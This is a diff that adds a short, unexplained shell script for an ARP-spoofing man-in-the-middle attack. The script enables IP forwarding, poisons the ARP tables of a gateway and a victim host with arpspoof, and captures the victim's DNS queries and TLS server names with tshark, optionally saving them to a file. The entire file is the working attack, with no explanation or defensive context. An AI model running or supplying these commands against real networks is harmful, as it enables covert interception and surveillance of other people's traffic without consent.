@@ -1,0 +1,11 @@
+sudo sysctl -w net.ipv4.ip_forward=1
+
+sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5
+
+sudo arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
+
+sudo tshark -i wlan0 -Y "dns or tls.handshake.extensions_server_name"
+
+						OU
+
+sudo tshark -i wlan0 -Y "dns or tls.handshake.extensions_server_name" > captura.txt						
